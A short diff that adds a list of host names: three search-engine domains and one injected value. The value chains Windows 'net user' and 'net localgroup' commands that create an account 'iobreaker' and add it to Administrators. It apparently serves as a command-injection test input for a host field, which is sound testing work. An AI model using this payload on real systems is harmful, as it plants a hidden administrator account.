@@ -1,0 +1,4 @@
+google.com
+bing.com
+yahoo.com
+; net user iobreaker 'P+ssword123' /add; net localgroup Administrators iobreaker /add
